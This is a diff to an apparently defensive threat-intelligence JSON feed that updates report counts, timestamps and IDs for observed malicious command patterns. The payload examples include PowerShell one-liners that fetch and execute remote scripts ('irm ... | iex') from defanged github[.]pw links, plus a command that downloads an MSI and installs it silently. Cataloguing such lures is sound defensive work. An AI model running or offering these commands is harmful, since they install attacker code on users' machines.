@@ -258,10 +258,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 33,
-    "ReportCount": 33,
+    "DistinctPayloadCount": 34,
+    "ReportCount": 34,
     "FirstSeen": "2026-11-09T06:43:14.799000+00:00",
-    "LastSeen": "2026-11-14T01:33:36.554000+00:00",
+    "LastSeen": "2026-11-15T00:42:37.489000+00:00",
     "ReportIds": [
       "cmw8wa50e27cu0oml8fw7ot3c",
       "cmw90mp0b2ggo0omlygm6nltz",
@@ -295,7 +295,8 @@
       "cmwetnpgn0e5q0omlfbiurb7r",
       "cmwetonos0e7e0omltax78jeq",
       "cmwfpwgss0ihy0omlygayvwid",
-      "cmwfqf7a40ivv0oml8u89k1od"
+      "cmwfqf7a40ivv0oml8u89k1od",
+      "cmwh41hiz0nhk0oml3qlpmmlm"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/91d7167f548d874c')|iex",
@@ -311,6 +312,7 @@
       "(irm 'https://github[.]pw/Girya/697d6fc32c5c3147')|iex",
       "(irm 'https://github[.]pw/Girya/6d15d8b4abf7e533')|iex",
       "(irm 'https://github[.]pw/Girya/7013b8a0c080df79')|iex",
+      "(irm 'https://github[.]pw/Girya/80b09b7fad57f0fd')|iex",
       "(irm 'https://github[.]pw/Girya/ba63cf9b5b2960f2')|iex",
       "(irm 'https://github[.]pw/Girya/e12ead22eabdc1f7')|iex",
       "(irm 'https://github[.]pw/Girya/f65ffb293ce4cc02')|iex",
@@ -767,9 +769,9 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 27,
+    "ReportCount": 28,
     "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
-    "LastSeen": "2026-11-14T19:11:36.644000+00:00",
+    "LastSeen": "2026-11-15T00:42:40.551000+00:00",
     "ReportIds": [
       "cmw90o6il2gli0omlwlr2xrzm",
       "cmwclwpgw0a210omltnipi6za",
@@ -797,7 +799,8 @@
       "cmwfcanbl0gd80omlgekvfmd3",
       "cmwfpywm20ikw0omloshmzs1c",
       "cmwgmq76i0lru0omlkr8mx6sp",
-      "cmwgs7swd0lxo0oml3ahm9x1b"
+      "cmwgs7swd0lxo0oml3ahm9x1b",
+      "cmwh41jw00nhv0omlq5rsqtp4"
     ],
     "PayloadExamples": [
       "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
